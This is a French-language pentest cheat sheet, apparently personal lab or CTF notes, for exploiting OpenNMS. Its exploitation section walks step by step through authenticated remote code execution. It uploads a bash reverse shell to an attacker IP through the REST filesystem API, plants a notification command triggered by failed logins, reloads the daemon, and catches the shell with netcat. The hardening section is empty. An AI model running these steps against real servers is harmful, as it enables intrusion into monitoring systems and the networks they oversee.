
[[#ENUMERATION MANUELLE]]
[[#EXPLOITATION]]
[[#HARDENING]]


# ENUMERATION MANUELLE


Page de login

https://10.129.201.50/opennms/index.jsp



# EXPLOITATION

## Authenticated RCE

Nécessite les rôles - `ROLE_FILESYSTEM_EDITOR` et - `ROLE_REST` ou `ROLE_ADMIN`

module metasploit
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/opennms_horizon_authenticated_rce.rb

Si ne fonctionne pas le faire manuellement ->  https://medium.com/@erik.wynter/privesc-to-rce-in-enterprise-grade-opennms-0ddf20a516f1

1. Identifier les extensions supportées

```
curl -X GET https://<ip>/opennms/rest/filesystem/extensions
```


2. Créer un script contenant un reverse shell depuis le file editor dans etc. Ou bien avec requête POST

```
POST /opennms/rest/filesystem/contents?f=pwn.bsh HTTP/1.1  
Host: 192.168.91.196  
Authorization: Basic ZmlsZTpmaWxl  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0  
Accept: application/json, text/plain, */*  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate, br  
Content-Type: multipart/form-data; boundary=---------------------------385917928240027663673494596945  
Content-Length: 238  
Origin: http://192.168.91.196
Connection: close  
  
  
-----------------------------385917928240027663673494596945  
Content-Disposition: form-data; name="upload"; filename="pwn.bsh"  
Content-Type: text/plain  
  
bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'
-----------------------------385917928240027663673494596945--
```

3. Créer une notificationCommand depuis le file editor dans /etc/notificationCommands.xml .

```
<command binary="true">  
	<name>get_shell</name>  
	<execute>/usr/bin/bash</execute>  
	<comment>pop thy shell</comment>  
	<argument streamed="false">  
		<substitution>/usr/share/opennms/etc/pwn.bsh</substitution>  
	</argument>  
</command>
-----------------------------385917928240027663673494596945--
```

4. Créer une destinationPath dans /etc/destinationPaths.xml pointant vers la notificationCommand créée précédemment

```
<path name="Get-Shell">  
	<target>  
		<name>Admin</name>  
		<command>get_shell</command>  
	</target>  
</path>
```

5. Puis créer une notification dans etc/notifications.xml qui sera déclenchée lors d'un échec d'authentification, celle ci doit pointer vers le destinationPath créé précédemment.

```
<notification name=Pwned" status="on">  
	<uei>uei.opennms.org/internal/authentication/failure</uei>  
	<rule>IPADDR != '1.1.1.1'</rule>  
	<destinationPath>Get-Shell</destinationPath>  
	<text-message>nothing to see here</text-message>  
</notification>
```

6. Reload la configuration OpenNMS (Necessite le role ROLE_REST ou ROLE_ADMIN) avec requête POST. (la valeur du paramètre host importe peu)

```
POST /opennms/rest/events HTTP/1.1  
Host: 192.168.91.196:8980  
Authorization: Basic {base64-encoded user creds}  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: en-US,en;q=0.5  
Accept-Encoding: gzip, deflate  
Content-Type: application/xml  
Content-Length: 363  
Origin: http://192.168.91.196:8980  
Connection: close  
  
<event >  
	<uei>uei.opennms.org/internal/reloadDaemonConfig</uei>  
	<source>perl_send_event</source>  
	<time>2023-05-12T06:43:50+00:00</time>  
	<host>51c12993e3b6</host>  
	<parms>  
		<parm>  
			<parmName><![CDATA[daemonName]]></parmName>  
			<value type="string" encoding="text"><![CDATA[Notifd]]></value>  
		</parm>  
	</parms>  
</event>
```

7. Lancer listerner sur la machine de l'attaquant

```
nc -lvnp 443
```


8. Faire une requête pour s'authentifier avec des identifiants erronés. Cela devrait trigger la notification que nous avons créé et exécuter notre reverse shell.

```
curl -u test:test http://nms.trilocor.local/opennms/admin
```




# HARDENING